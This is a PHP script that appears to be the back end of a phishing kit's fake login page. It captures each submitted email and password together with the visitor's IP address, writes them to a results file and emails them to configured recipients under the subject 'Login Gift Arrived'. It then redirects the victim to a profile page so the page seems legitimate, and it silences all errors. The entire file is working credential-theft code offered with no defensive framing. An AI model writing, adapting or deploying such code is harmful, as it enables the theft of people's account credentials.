<?php
error_reporting(0);
ini_set("output_buffering",4096);
@ob_start();
session_start();

require_once 'inc/functions.php';
require_once 'inc/config.php';

$isValidEmail = false;
$isValidPassword = false;

$redirect_filename = "login.php";


$host = sha1(bin2hex($_SERVER['HTTP_HOST']));

if(isset($_POST['email']) && trim($_POST['email']) !== '')
{
	if(is_email($_POST['email'])) {
		$isValidEmail = true;
	}
	$_SESSION['LoginId'] = $_POST['email'];
}


if(isset($_POST['password']) && trim($_POST['password']) !== '')
{
	if (strlen($_POST['password']) > 5) {
		$isValidPassword = true;
		$_SESSION['Passcode'] = $_POST['password'];
	}
}


function build_log_data()
{
	$ip = isset($_SESSION['IP_INFO']['IP']) ? $_SESSION['IP_INFO']['IP'] : get_client_ip();
	$user = $_SESSION['LoginId'];
	$pass = $_SESSION['Passcode'];

	$data = "$user:$pass:$ip\n";
	return $data;
}

if (!$isValidPassword || !$isValidEmail) {
	header("Location: $redirect_filename?error=true&sessionid=".$host);
} else  {
	
	$data = build_log_data();
	if($save_results_to_text)
	{
		append_to_file($results_logins_file, $data);
	}

	if($send_results_to_email)
	{
		$user = $_SESSION['LoginId'];

		$from_name = 'Gifts Maker';
		$from_email = 'no-reply@gifts.io';
		$subject = "Login Gift Arrived - $user";
		send_email($recipients, $from_name, $from_email, $subject, $data);
	}


	header("Location: profile.php?loggedin=true&result=0&sessionid=".$host);
}
ob_end_flush();

?>